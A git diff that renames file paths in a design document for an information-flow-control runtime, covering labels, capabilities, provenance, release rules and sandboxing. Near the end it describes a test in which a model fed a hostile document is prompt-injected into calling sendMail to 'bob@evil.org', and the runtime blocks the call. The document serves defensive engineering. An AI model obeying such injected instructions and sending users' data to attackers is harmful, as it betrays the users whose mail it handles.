@@ -31,7 +31,7 @@ one shared SQLite table in one space, and issue the same query. Ten
 seconds, offline, no browser, no server:
 
 ```
-cd packages/patterns
+cd patterns
 deno test -A integration/sqlite-read-clearance-multi-runtime.test.ts
 ```
 
@@ -61,11 +61,11 @@ how that happens.
 Two opt-ins are required in the pattern — `table(..., { allowReadClearance:
 true })` and `db.query(..., { readClearance: true })`. Absent either, the
 gate errors rather than silently applying
-(`packages/runner/src/builtins/sqlite/row-label-read.ts`).
+(`runtime/runner/src/builtins/sqlite/row-label-read.ts`).
 
 ## The label is data, and the row derives its own
 
-From `packages/patterns/cfc-row-label-records/main.tsx`, the whole rule:
+From `patterns/examples/cfc-row-label-records/main.tsx`, the whole rule:
 
 ```tsx
 (f) => ({
@@ -80,8 +80,8 @@ That is an ordinary arrow function in a TypeScript file. It does not
 survive compilation as code:
 
 ```
-deno task cf check packages/patterns/cfc-row-label-records/main.tsx \
-  --pattern-json --root packages/patterns
+deno task cf check patterns/examples/cfc-row-label-records/main.tsx \
+  --pattern-json --root patterns
 ```
 
 ```json
@@ -105,13 +105,13 @@ query node carries its own declared ceiling.
 
 ## The code is constrained by what it does, not who wrote it
 
-`packages/patterns/counter/counter.tsx` is ordinary TypeScript. Nothing
+`patterns/examples/counter/counter.tsx` is ordinary TypeScript. Nothing
 in it mentions policies, capabilities, or labels. One input is annotated
 `Writable<number | Default<0>>`, and two closures use it — an `action`
 that only writes, a `computed` that only reads:
 
 ```
-deno task cf check packages/patterns/counter/counter.tsx --show-transformed --no-run
+deno task cf check patterns/examples/counter/counter.tsx --show-transformed --no-run
 ```
 
 The writer's capture:
@@ -153,7 +153,7 @@ const __cfLift_1 = __cfHelpers.lift<
 Same cell, same annotation, two schemas differing in one token. The
 author wrote neither. `readonly` and `writeonly` were computed from what
 each closure body does
-(`packages/ts-transformers/src/policy/capability-analysis.ts`).
+(`base/ts-transformers/src/policy/capability-analysis.ts`).
 
 Two consequences. Least privilege is derived rather than declared, so it
 cannot drift from the code it describes. And the unit of capture is a
@@ -167,7 +167,7 @@ path. The runtime has nowhere to put the answer.
 
 Capabilities and schemas are derived from types, which makes the type
 system load-bearing. So the escape hatch is closed
-(`packages/ts-transformers/src/transformers/cast-validation.ts`, the
+(`base/ts-transformers/src/transformers/cast-validation.ts`, the
 first of 26 pipeline stages):
 
 ```
@@ -178,7 +178,7 @@ Casts bypass reactive tracking and type safety.
 A pattern also cannot mint the evidence its own gates require. Declaring
 `InjectionSafe` on your own data gets the claim stripped at persist and
 the dependent write rejected
-(`packages/runner/test/cfc-integrity-mint-gate.test.ts`):
+(`runtime/runner/test/cfc-integrity-mint-gate.test.ts`):
 
 ```ts
 it("does not let an author-declared InjectionSafe satisfy a requiredIntegrity gate", async () => {
@@ -191,15 +191,15 @@ it("does not let an author-declared InjectionSafe satisfy a requiredIntegrity ga
 The second case repeats the proof across seven forged evidence atoms.
 Nineteen atom types are runtime-minted, along with the compiler
 attestation and the system string atoms listed in `CFC_SYSTEM_STRING_ATOMS`
-(`packages/api/cfc.ts`), among them Loom's verified external identity; an
+(`base/api/cfc.ts`), among them Loom's verified external identity; an
 author-declared one survives only when the writer's identity is a builtin
-(`packages/runner/src/cfc/prepare.ts`).
+(`runtime/runner/src/cfc/prepare.ts`).
 
 The runtime does not trust its own compiler either: the classification
 the transformer emitted is re-derived from the emitted bytes by a
 separately written parser, which has an adversarial corpus of 59
 hand-built attack fixtures
-(`packages/runner/test/esm-verifier-adversarial.test.ts`):
+(`runtime/runner/test/esm-verifier-adversarial.test.ts`):
 
 ```ts
 // Each fixture is a compiled-CommonJS body an attacker might hand-craft to defeat
@@ -211,10 +211,10 @@ hand-built attack fixtures
 
 Enforcement is also a ratchet. A pattern holding a `Cell` reaches no
 transaction through it, since a cell keeps its transaction private
-(`packages/runner/test/cell-authority.test.ts`), and behind that,
+(`runtime/runner/test/cell-authority.test.ts`), and behind that,
 weakening the enforcement mode on a transaction throws rather than
 succeeding
-(`packages/runner/src/storage/extended-storage-transaction.ts`).
+(`runtime/runner/src/storage/extended-storage-transaction.ts`).
 
 The obvious objection is that none of this is new. Flow control has been
 understood for decades and has mostly stayed in research systems,
@@ -232,7 +232,7 @@ lab and one that ships.
 Which raises the obvious question: if no code is trusted, how does
 anything you authorize ever happen? A field can require that its write
 came from a named function, invoked through a named surface. From
-`packages/patterns/cfc-authorized-save/main.tsx`, two buttons — the
+`patterns/examples/cfc-authorized-save/main.tsx`, two buttons — the
 second wired to the same stream as the reviewed one:
 
 ```tsx
@@ -250,7 +250,7 @@ A real Chrome click on that button is a genuine user gesture —
 writer identity, checked independently: the renderer's own unforgeable
 mark on the event, and a write attributed to the content-addressed
 identity and binding path of the reviewed handler. The browser test
-clicks both (`packages/patterns/integration/cfc-authorized-save.test.ts`):
+clicks both (`patterns/integration/cfc-authorized-save.test.ts`):
 
 ```ts
 it("accepts the trusted surface and rejects a lookalike host button", ...)
@@ -265,7 +265,7 @@ says so, since a synthesized DOM event also carries `isTrusted`.
 ## Across machines: carry the reference, not the bytes
 
 A label is only useful if it survives leaving the machine that made it.
-`packages/runner/test/cfc-cross-space-integrity.test.ts` walks the
+`runtime/runner/test/cfc-cross-space-integrity.test.ts` walks the
 scenarios: a cross-space link retains the source integrity plus an
 endorsement, a copy of that link carries and verifies, and
 
@@ -277,7 +277,7 @@ Provenance is what makes that checkable. A module's identity is its
 content hash, `cf:module/<hash>`, and the registry is a WeakMap populated
 only during verified evaluation — so an attacker-supplied function with
 byte-identical source has no entry and resolves to nothing
-(`packages/runner/src/harness/verified-provenance.ts`).
+(`runtime/runner/src/harness/verified-provenance.ts`).
 
 The boundary is the interesting part, and the file states it plainly:
 
@@ -294,7 +294,7 @@ both sets of rules, and a system that could only do that would soon be
 unable to send anything anywhere — the summary of your mail could not
 go to your accountant, because the mail could not. So the runtime has
 one way to relax a rule, and it is not an edit to stored data. From
-`packages/patterns/cfc-exchange-rules/direct-release.tsx`, the rule,
+`patterns/examples/cfc-exchange-rules/direct-release.tsx`, the rule,
 and the field that names it as its own release path:
 
 ```tsx
@@ -322,7 +322,7 @@ The release path travels with the value rather than with the program
 reading it. The rule may rewrite only the clause that names it; sibling
 clauses, and anything derived from other inputs, stay conjunctive and
 untouched
-(`packages/runner/test/cfc-module-policy-eval.test.ts`):
+(`runtime/runner/test/cfc-module-policy-eval.test.ts`):
 
 ```ts
 it("keeps wrong-subject evidence closed and sibling clauses untouched", () => {
@@ -334,19 +334,19 @@ gate above protects. Two switches govern this, and both are built:
 `cfcPolicyEvaluation`, which decides whether rules are evaluated at the
 commit and sink gates, is pinned to `enforce` in the core preset, so the
 rule above is consulted there; the render ceiling, which mints that
-membership fact (`packages/runner/src/cfc/render-ceiling.ts`), is
+membership fact (`runtime/runner/src/cfc/render-ceiling.ts`), is
 on by default in the browser shell, with a per-profile opt-out
-(`packages/shell/src/lib/render-ceiling.ts`). The display boundary follows
+(`runtime/shell/src/lib/render-ceiling.ts`). The display boundary follows
 the render ceiling rather than the dial: it consults the rule wherever
 the ceiling is on, reading the manifest the label pins from the space
 the label is stored in, so the owner and each verified reader of the
 policy's subject space see the value and nobody else does
-(`packages/runtime-client/test/backends/render-audience.test.ts`).
+(`runtime/runtime-client/test/backends/render-audience.test.ts`).
 
 The stored label never loosens. Under `cfcDeclaredMonotonicity: "enforce"`
 a re-mint that drops a clause is refused, naming the document, the path
 and the direction
-(`packages/runner/test/cfc-declared-monotonicity.test.ts`):
+(`runtime/runner/test/cfc-declared-monotonicity.test.ts`):
 
 ```ts
 expect(message).toContain("declared-monotonicity confidentiality");
@@ -361,16 +361,16 @@ defaults to `observe`, which reports a dropped clause without refusing
 it, because a per-principal `addIntegrity` mint names whichever principal
 is acting and so cannot be monotone yet; it is pinned to `enforce` in the
 `MAX_ENFORCEMENT_CFC_OPTIONS` bundle
-(`packages/runner/src/runtime-presets.ts`).
+(`runtime/runner/src/runtime-presets.ts`).
 
 A durable release — this value, to that person, until revoked — is a
 grant: a content-addressed record at a reserved address, written only
 through `writeCfcGrant` and consulted when a rule is evaluated, so
 revoking it is an edit to the grant rather than to the data. An
 unprivileged write into that namespace fails closed at prepare
-(`packages/runner/src/storage/interface.ts`). A grant can be single-use,
+(`runtime/runner/src/storage/interface.ts`). A grant can be single-use,
 in which case the release and its receipt commit together
-(`packages/runner/test/cfc-single-use-grants.test.ts`):
+(`runtime/runner/test/cfc-single-use-grants.test.ts`):
 
 ```ts
 // The receipt write is staged in the SAME transaction (atomic).
@@ -390,13 +390,13 @@ arguing with.
 ## The exits
 
 A pattern runs in a compartment whose globals are installed deliberately
-(`packages/runner/src/sandbox/compartment-globals.ts`), because the
+(`runtime/runner/src/sandbox/compartment-globals.ts`), because the
 checker only sees writes: a timer or shared memory is a channel through
 which a program can signal what it knows without ever writing it down,
 so those are absent, and the clock and the random source are coarsened.
 Covert channels that do not leave through a named exit are handled
 elsewhere and this document does not cover them:
-`packages/utils/src/sandbox-contract.ts` lists the withheld globals,
+`base/utils/src/sandbox-contract.ts` lists the withheld globals,
 recording beside each the channel it closes or that nothing has
 supplied it,
 and `docs/specs/sandboxing/TIMING_SIDE_CHANNELS.md` tables every
@@ -404,7 +404,7 @@ real-time-correlated signal a pattern can reach with its status, its
 mitigation, and the test pinning it.
 
 Reactive egress leaves through a named sink, and the sinks are one
-enumerable list (`packages/runner/src/cfc/sink-inventory.ts`):
+enumerable list (`runtime/runner/src/cfc/sink-inventory.ts`):
 
 ```ts
 export type InitialSinkName =
@@ -422,7 +422,7 @@ export type InitialSinkName =
 
 `llm` and `generateText` are exits in exactly the sense `fetchJson` is,
 which makes prompt injection a dataflow question rather than a prompting
-one. `packages/runner/test/cfc-agent-prompt-injection-demo.test.ts` runs
+one. `runtime/runner/test/cfc-agent-prompt-injection-demo.test.ts` runs
 a real runtime at the default enforcement mode through a real tool loop.
 The model is given a hostile document and capitulates completely: it
 emits `sendMail(recipient: "bob@evil.org")` as a literal. The runtime
@@ -469,32 +469,32 @@ Every authored pattern entry file in the repository is compiled,
 transformed and SES-verified on every pull request
 (`deno task cfcheck`). A second gate (`deno task pattern-compat`)
 replays each of those patterns against every contract recorded for it
-under `packages/patterns/baselines/`, because the updater performs no
+under `patterns/baselines/`, because the updater performs no
 structural check before swapping a pattern onto a running piece.
 Pattern tests run at `enforce-strict`, the same mode the servers run,
 rather than in an observe mode that would let violations pass. That
 is the runtime's default, no flag sets it, and both server hosts are
-pinned to it (`packages/runner/src/runtime.ts`, `runtime-presets.ts`);
+pinned to it (`runtime/runner/src/runtime.ts`, `runtime-presets.ts`);
 a test that needs a laxer rung states one.
 The two-readers test at the top of this document runs at that plain
 default. A grep will also turn up
 `DEFAULT_CFC_ENFORCEMENT_MODE = "disabled"` in `cfc/types.ts`, which is
 the transaction-level default, not this one.
 
-The flow-control layer is `packages/runner/src/cfc/`: about 50 modules
+The flow-control layer is `runtime/runner/src/cfc/`: about 50 modules
 and 26,000 lines, with about 150 test files beside them in
-`packages/runner/test`. Every dial it exposes is implemented, and every
+`runtime/runner/test`. Every dial it exposes is implemented, and every
 enforcement dial defaults to its strictest sound rung, in the one table the runtime
 resolves its dials through (`RUNTIME_CFC_DIAL_DEFAULTS` in
-`packages/runner/src/cfc/posture-report.ts`). Label propagation runs at
+`runtime/runner/src/cfc/posture-report.ts`). Label propagation runs at
 `persist`, so a value derived from labeled data is written with its
 derived label rather than laundering it away; the write floor, trigger
 read gating, policy evaluation and label-metadata protection all
 enforce. A host can still dial an environment back by naming a lower
 rung. Access control on spaces defaults to `enforce` on the production
-server (`packages/toolshed/env.ts`). The harness that dogfoods the
+server (`runtime/toolshed/env.ts`). The harness that dogfoods the
 runtime turns the whole `MAX_ENFORCEMENT_CFC_OPTIONS` bundle on by
-default (`packages/cf-harness/console/server.ts`), adding the standard
+default (`runtime/cf-harness/console/server.ts`), adding the standard
 prompt-caveat policy, sink ceilings and an enforcing monotonicity gate,
 and its committed run ledgers record real refusals.
 
